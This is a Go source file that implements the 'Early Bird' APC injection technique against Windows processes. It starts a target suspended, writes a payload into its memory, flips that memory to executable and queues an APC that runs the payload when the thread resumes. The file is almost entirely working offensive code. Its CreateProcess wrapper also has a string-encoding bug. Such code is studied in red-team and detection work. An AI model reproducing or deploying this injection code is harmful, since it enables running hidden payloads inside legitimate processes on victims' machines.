package main

import "os"
import "fmt"
import "syscall"
import "unsafe"


func CreateProcess(lpApplicationName string, lpCommandLine string, lpProcessAttributes uintptr, lpThreadAttributes uintptr,
   bInheritHandles uintptr, dwCreationFlags int, lpEnvironment uintptr, 
   lpCurrentDirectory uintptr, lpStartupInfo uintptr, lpProcessInformation uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("CreateProcessA").Call(
      uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpApplicationName))),
      uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpCommandLine))),
      uintptr(lpProcessAttributes),
      uintptr(lpThreadAttributes),      
      uintptr(bInheritHandles),
      uintptr(dwCreationFlags),
      uintptr(lpEnvironment),
      // uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpCurrentDirectory))),
      uintptr(lpCurrentDirectory),
      uintptr(lpStartupInfo),
      uintptr(lpProcessInformation),

   )
   return uintptr(ret)
}


func Earlybird_Injection(proc string, payload []byte) {
   // CreateProcess
   var sI syscall.StartupInfo;
   var pI syscall.ProcessInformation;
   argv := syscall.StringToUTF16Ptr(proc);
   var err error = syscall.CreateProcess( nil, argv, nil, nil, false, 4, nil, nil, &sI, &pI);
   if (err != nil){
      fmt.Println("[+] CreateProcess error: \t\t", err);
   }
   fmt.Println("[+] Process ID: \t\t\t", pI.ProcessId);
   fmt.Println("[+] Thread ID: \t\t\t\t", pI.ThreadId);

   // VirtualAllocEx
   var assigned_address uintptr = VirtualAllocEx(uintptr(pI.Process), 0, uintptr(len(payload)), 0x1000 | 0x2000, 0x04);
   if (assigned_address == 0){
      fmt.Println("[-] VirtualAllocEx API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] Address from VirtualProtectEx:\t", fmt.Sprintf("0x%x", assigned_address));
   
   // WriteProcessMemory
   var res uintptr = WriteProcessMemory(uintptr(pI.Process), assigned_address, uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)));
   if (res == 0){
      fmt.Println("[-] WriteProcessMemory API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] WriteProcessMemory response:\t", res);

   // VirtualProtectEx
   var oldProtect uintptr = 0x04
   var vpe_res uintptr = VirtualProtectEx(uintptr(pI.Process), assigned_address, uintptr(len(payload)), 0x20, uintptr(unsafe.Pointer(&oldProtect)));
   fmt.Println("[+] VirtualProtectEx response:\t\t", vpe_res);

   // QueueUserAPC
   var queueUserAPC_res uintptr = QueueUserAPC(assigned_address, uintptr(pI.Thread), 0);
   fmt.Println("[+] QueueUserAPC response:\t\t", queueUserAPC_res);

   // ResumeThread
   ResumeThread(uintptr(pI.Thread));
   
   // CloseHandle
   CloseHandle(uintptr(pI.Process))
   CloseHandle(uintptr(pI.Thread))
}